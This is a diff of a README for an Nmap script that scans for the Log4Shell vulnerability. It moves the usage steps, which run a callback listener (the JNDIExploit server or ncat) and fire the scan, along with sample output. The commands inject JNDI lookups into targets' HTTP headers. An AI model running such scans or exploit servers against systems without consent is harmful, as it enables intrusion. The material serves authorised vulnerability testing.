@@ -23,41 +23,6 @@ Copy the provided script (log4shell.nse) into that directory run `nmap --script-
 
 ## Usage
 
-### Method A:
-
-Download JNDIExploit from GitHub (https://github.com/feihong-cs/JNDIExploit)
-
-Start JNDIExploit server:
-
-    java -jar JNDIExploit.jar
-
-Run Nmap with --script log4shell.nse script
-
-    nmap --script log4shell.nse [--script-args log4shell.callback-server=127.0.0.1:1389] [-p <port>] <target>
-
-See JNDIExploit output for see the received LDAP query (Log4Shell/{target host}/{target port})
-
-    [+] Received LDAP Query: log4shell/127.0.0.1/8080
-    [!] Invalid LDAP Query: log4shell/127.0.0.1/8080
-
-### Method B:
-
-Listen a TCP port with netcat (or ncat):
-
-    ncat -v -k -e /bin/true -l 1389
-
-Run Nmap with --script log4shell.nse script
-
-    nmap --script log4shell.nse [--script-args log4shell.callback-server=127.0.0.1:1389] [-p <port>] <target>
-
-See the target IP address in netcat (or ncat) output:
-
-    Ncat: Connection from 172.17.0.2.
-    Ncat: Connection from 172.17.0.2:38898.
-
-
-### Output
-
     nmap --script log4shell.nse --script-args log4shell.callback-server=172.17.42.1:1389 -p 8080 172.17.42.1 
     Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-13 21:26 CET
     Nmap scan report for 172.17.42.1
@@ -114,6 +79,38 @@ See the target IP address in netcat (or ncat) output:
 - `log4shell.callback-server`: The callback server (eg. `172.17.42.1:1389`)
 - `log4shell.http-headers`: Comma-separated list of HTTP headers (eg. `X-Api-Version.User-Agent,Referer`)
 
+
+### Method A:
+
+Download JNDIExploit from GitHub (https://github.com/feihong-cs/JNDIExploit)
+
+Start JNDIExploit server:
+
+    java -jar JNDIExploit.jar
+
+Run Nmap with --script log4shell.nse script
+
+    nmap --script log4shell.nse [--script-args log4shell.callback-server=127.0.0.1:1389] [-p <port>] <target>
+
+See JNDIExploit output for see the received LDAP query (Log4Shell/{target host}/{target port})
+
+    [+] Received LDAP Query: log4shell/127.0.0.1/8080
+    [!] Invalid LDAP Query: log4shell/127.0.0.1/8080
+
+### Method B:
+
+Listen a TCP port with netcat (or ncat):
+
+    ncat -v -k -e /bin/true -l 1389
+
+Run Nmap with --script log4shell.nse script
+
+    nmap --script log4shell.nse [--script-args log4shell.callback-server=127.0.0.1:1389] [-p <port>] <target>
+
+See the target IP address in netcat (or ncat) output:
+
+    Ncat: Connection from 172.17.0.2.
+    Ncat: Connection from 172.17.0.2:38898.
 
 # Legal Disclaimer
 This project is made for educational and ethical testing purposes only. Usage of nmap-log4shell for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.
